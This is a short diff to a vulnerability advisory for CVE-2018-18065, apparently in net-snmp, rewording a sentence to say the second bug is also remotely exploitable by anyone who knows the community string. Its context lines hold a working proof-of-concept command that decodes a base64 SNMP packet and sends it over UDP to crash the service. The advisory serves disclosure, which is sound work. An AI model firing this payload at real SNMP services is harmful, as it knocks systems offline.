@@ -62,7 +62,7 @@ Same configuration for both bugs:
 VULN#2 CVE-2018-18065
 =====================
 
-Second bug is remotely exploitable only with knowledge of the community string (in this case "public") leading to Denial of Service:
+Second bug is also remotely exploitable but only with knowledge of the community string (in this case "public") leading to Denial of Service:
 
   # echo -n "MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAwxNzIuMzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht63NgQNMjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y" | base64 -d > /dev/udp/127.0.0.1/1111
 
